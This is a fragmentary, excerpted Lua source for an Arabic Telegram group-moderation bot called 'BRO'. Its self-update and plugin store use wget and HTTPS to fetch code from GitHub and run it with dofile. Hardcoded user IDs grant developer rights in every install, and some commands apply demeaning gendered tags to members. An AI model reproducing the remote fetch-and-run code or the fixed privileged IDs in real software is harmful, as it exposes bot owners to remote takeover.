...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./BRO.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Run", "w")  
...
--------------------------------------------------------------------------------------------------------------
print([[
      ,ggggggggggg,   ,ggggggggggg,     _,gggggg,_     
    dP"""88""""""Y8,dP"""88""""""Y8, ,d8P""d8P"Y8b,   
    Yb,  88      `8bYb,  88      `8b,d8'   Y8   "8b,dP
     `"  88      ,8P `"  88      ,8Pd8'    `Ybaaad88P'
         88aaaad8P"      88aaaad8P" 8P       `""""Y8  
         88""""Y8ba      88""""Yb,  8b            d8  
         88      `8b     88     "8b Y8,          ,8P  
         88      ,8P     88      `8i`Y8,        ,8P'  
         88_____,d8'     88       Yb,`Y8b,,__,,d8P'   
        88888888P"       88        Y8  `"Y8888P"'     
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-BRO/Files_BRO/main/Files_BRO/commands.lua") 
...
sudo_users = {SUDO,119541395,1595381496}   
...
if tonumber(user_id) == tonumber(1595381496) then  
var = true  
...
local UserName = (data.username_ or "OH0OC")
...
local s00f4_Msg = ''  
if msgs < 100 then 
s00f4_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
s00f4_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
s00f4_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
s00f4_Msg = 'متفاعل' 
elseif msgs < 1200 then 
s00f4_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
s00f4_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
s00f4_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
s00f4_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
s00f4_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
s00f4_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
s00f4_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
s00f4_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
s00f4_Msg = 'رب التفاعل'  
end 
return s00f4_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"سورس برو")  
...
function plugin_s00f4(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.s00f4 and msg then
pre_msg = plugin.s00f4(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sources00f4(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,s00f4_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf BRO.lua')
os.execute('wget wget https://raw.githubusercontent.com/SRC-BRO/BRO/main/BRO.lua')
send(msg.chat_id_, msg.id_,'߷︙تم تحديث السورس\n߷︙لديك اخر اصدار لسورس برو\n߷︙الاصدار » { v 1}')
dofile('BRO.lua')  
end
if text == 'الاصدار ߷' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ߷︙اصدار سورس برو \n ߷︙الاصدار »{ v 1}')
end
...
-------------
if text == "߷ تحديثات سورس برو ߷" and DevSoFi(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس برو*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '➺🗃 𝘽𝙧𝙤 🇮🇶 "✨". ➤', url="t.me/OH0OC"}},
}
...
send(msg.chat_id_, msg.id_,'߷︙ عدد الكروبات الان » { '..#group..' }'..s00f4k..''..s00f4..'\n߷︙ الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ߷︙العضو » ['..result.title_..'](t.me/'..(username or 'OH0OC')..')'
status  = '\n ߷︙تم ترقيته مطور'
...
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
status  = '\n ߷︙تم ترقيته مطور'
...
local s00f41_Msg = database:get(bot_id.."s00f41:Add:Filter:Rp2"..text..msg.chat_id_)   
if s00f41_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ߷︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'OH0OC')..') \n ߷︙'..s00f41_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if s00f4_Msg and not Special(msg) then  
local s00f4_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if s00f4_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ߷︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ߷︙["..s00f4_Msg.."] \n")
else
send(msg.chat_id_,0," ߷︙العضو : {["..data.first_name_.."](T.ME/OH0OC)}\n ߷︙["..s00f4_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ߷︙عذرا » {["..data.first_name_.."](T.ME/OH0OC)}\n ߷︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
os.execute('rm -rf BRO.lua')
os.execute('wget https://raw.githubusercontent.com/SRC-BRO/BRO/main/BRO.lua')
send(msg.chat_id_, msg.id_,'߷︙تم تحديث السورس\n߷︙لديك اخر اصدار لسورس برو\n߷︙الاصدار » { v 1}')
dofile('BRO.lua')  
end
...
database:sadd(bot_id.."s00f4:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."s00f4:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_S00F4 = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_S00F4 then 
names_S00F4 = database:smembers(bot_id.."s00f4:blocname"..msg.chat_id_) or ""
if names_S00F4 and names_S00F4[1] then 
for i=1,#names_S00F4 do 
if name_S00F4:match("(.*)("..names_S00F4[i]..")(.*)") then 
...
database:set(bot_id.."s00f4:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."s00f4:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."s00f4:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."s00f4:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."s00f4:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_S00F4a_new(S00F41,S00F42)
if S00F42 and S00F42.first_name_ then 
if S00F42.first_name_:match("(.*)"..database:get(bot_id.."s00f4:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."s00f4:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local S00F4_nnn = database:get(bot_id.."s00f4:nump"..msg.chat_id_) or 5
local S00F4_nnn2 = database:get(bot_id.."s00f4:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(S00F4_nnn2) == tonumber(S00F4_nnn) or tonumber(S00F4_nnn2) > tonumber(S00F4_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."s00f4:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "߷︙ عزيزي >>["..S00F42.username_.."](https://t.me/"..(S00F42.username_ or "OH0OC")..")\n߷︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."s00f4:teh"..msg.chat_id_).."} بجانب اسمك\n߷︙ عدد المحاولات المتبقيه {"..(tonumber(S00F4_nnn) - tonumber(S00F4_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_S00F4a_new)
end
end
...
local s00f4ChengName = database:get(bot_id.."s00f4:Cheng:Name"..data.id_)
if not data.first_name_ then 
if s00f4ChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..s00f4ChengName..']')
database:del(bot_id.."s00f4:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if s00f4ChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."s00f4:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local s00f4ChengUserName = database:get(bot_id.."s00f4:Cheng:UserName"..data.id_)
if not data.username_ then 
if s00f4ChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..s00f4ChengUserName..']')
database:del(bot_id.."s00f4:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if s00f4ChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."s00f4:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local s00f4ChengPhoto = database:get(bot_id.."s00f4:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if s00f4ChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."s00f4:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if s00f4ChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."s00f4:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
local inline = {
{{text = '߷︙𝙎𝙤𝙪𝙧𝙘𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡', url="t.me/OH0OC"},},
{{text = '߷︙𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙐𝙥𝙙𝙖𝙩𝙚𝙨', url="t.me/OH0OC"},},
{{text = '߷︙𝙎𝙤𝙪𝙧𝙘𝙚 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧', url="t.me/A39_H"},},
{{text = '𓂅  𝚃𝚆𝚂 𝙻𝙾𝚁𝙳𝚂𝙷𝙸𝙿', url="t.me/ahmademadBoT"},},}
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ߷︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'OH0OC')..') \n ߷︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ߷︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'OH0OC')..') \n ߷︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-BRO/Files_BRO/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ߷︙اهلا بك في متجر ملفات برو\n ߷︙ملفات السورس ↓\n⊶────≺BRO≻────⊷\n\n"
local TextE = "\n⊶────≺BRO≻────⊷\n ߷︙علامة تعني { ✔️ } ملف مفعل\n ߷︙علامة تعني { ✖ } ملف معطل\n ߷︙قناة سورس برو ↓\n".." ߷︙[اضغط هنا لدخول](t.me/OH0OC) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-BRO/Files_BRO/main/Files_BRO/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('BRO.lua')  
else
send(msg.chat_id_, msg.id_," ߷︙عذرا الملف لايدعم سورس برو \n") 
end
return false
end
...
if text == 'ملصق' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
if text == 'صوت' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
if text == 'بصمه' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "SRC-BRO")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ߷︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
status  = '\n ߷︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ߷︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
...
if text == 'تنزيل النفسيات' and Mod(msg) then
database:del(bot_id..'Nfcah:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ߷︙تم مسح جميع النفسيات')
end
if text == ("تاك للنفسيات") and Mod(msg) then
local list = database:smembers(bot_id..'Nfcah:User'..msg.chat_id_)
t = "\n ߷︙قائمة نفسيات الكروب \n⊶────≺BRO≻────⊷\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» النفسيه [@"..username.."]\n"
else
t = t..""..k.."» النفسيه `"..v.."`\n"
end
end
...
---------
if text == ("رفع نفسيه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:sadd(bot_id..'Nfcah:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ߷︙تم رفع العضو نفسيه في الكروب \n ߷︙شكد نفسيه نخاف بس نطخك تجينه بالتفك نين وين ليش بيش حيش طيط طيط طط'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if (text == ("تنزيل نفسيه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:srem(bot_id..'Nfcah:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
status  = '\n ߷︙تم تنزيل العضو نفسيه في الكروب\n ߷︙تعال حبي خليك سبورتي اضحك وتونس هيه خربانة وداعتك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Zogty:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ߷︙تم مسح جميع النسوان')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Zogty:User'..msg.chat_id_)
t = "\n ߷︙قائمة نسوان الكروب \n⊶────≺BRO≻────⊷\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
function start_function(extra, result, success)
database:sadd(bot_id..'Zogty:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ߷︙تم رفع العضو مرتي في الكروب \n ߷︙الف مبروك الكم بالرفاء والبنين الذرية الصالحه '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
function start_function(extra, result, success)
database:srem(bot_id..'Zogty:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
status  = '\n ߷︙تم تنزيل العضو مرتي في الكروب\n ߷︙لا والحظ تطلكو تطلكو شوفو منو سوالهم سحر'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if text == 'تنزيل حك الكل' and Mod(msg) then
database:del(bot_id..'7ky:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ߷︙تم مسح حك الكل')
end
if text == ("تاك حك الكل") and Mod(msg) then
local list = database:smembers(bot_id..'7ky:User'..msg.chat_id_)
t = "\n ߷︙قائمة حك الكروب \n⊶────≺BRO≻────⊷\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."» حك مدري منو [@"..username.."]\n"
else
t = t..""..k.."» حك مدري منو `"..v.."`\n"
end
end
...
---------
if text == ("رفع حكي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:sadd(bot_id..'7ky:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ߷︙تم رفع العضو حكي في الكروب \n ߷︙تعاي صرتي حكي عمري اليوصل حدج بعده منخلق'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if (text == ("تنزيل حكي")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
function start_function(extra, result, success)
database:srem(bot_id..'7ky:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ߷︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
status  = '\n ߷︙تم تنزيل العضو حكي في الكروب\n ߷︙وليي يلا خاينة بعد مايدج'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:set(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ߷︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."s00f41:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."s00f41:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ߷︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."s00f41:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."s00f41:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."s00f41:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ߷︙ارسل الكلمه الان")  
database:set(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."s00f41:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."s00f41:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
for k,v in pairs(list) do  
database:del(bot_id.."s00f41:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."s00f41:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."s00f41:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ߷︙قائمة المنع \n⊶────≺BRO≻────⊷\n"
for k,v in pairs(list) do  
local s00f4_Msg = database:get(bot_id.."s00f41:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..s00f4_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ߷︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'OH0OC')..')'..'\n ߷︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'برو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'برو')
local s00f4_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..s00f4_Msg[math.random(#s00f4_Msg)]..']') 
return false
end
...
database:set(bot_id.."SOFI:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."SOFI:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."SOFI:insta_bot"..msg.chat_id_) == "open" then
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'برو').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'OH0OC')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
s00f4dx(msg.chat_id_, msg.id_, ' ߷︙ايدي المجموعة » ( '..msg.chat_id_..' )\n ߷︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ߷︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n ߷︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
send(msg.chat_id_, msg.id_, t..'⊶────≺BRO≻────⊷\n߷︙➺ .[🗃 𝘽𝙧𝙤 🇮🇶 "✨". ➤ ](t.me/OH0OC)✫ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'برو')
...
s00f4 = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(s00f4)
...
--------------------------------------------------------------------------------------------------------------
Sources00f4(data.message_,data)
plugin_s00f4(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local s00f4Abot = database:get(bot_id.."s00f41:Add:Filter:Rp2"..text..result.chat_id_)   
if s00f4Abot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ߷︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ߷︙["..s00f4Abot.."] \n") 
...
------------------------------------------------------------------------
if text then
local s00f41_Msg = database:get(bot_id.."s00f41:Add:Filter:Rp2"..text..result.chat_id_)   
if s00f41_Msg then    
send(msg.chat_id_, msg.id_," ߷︙"..s00f41_Msg)
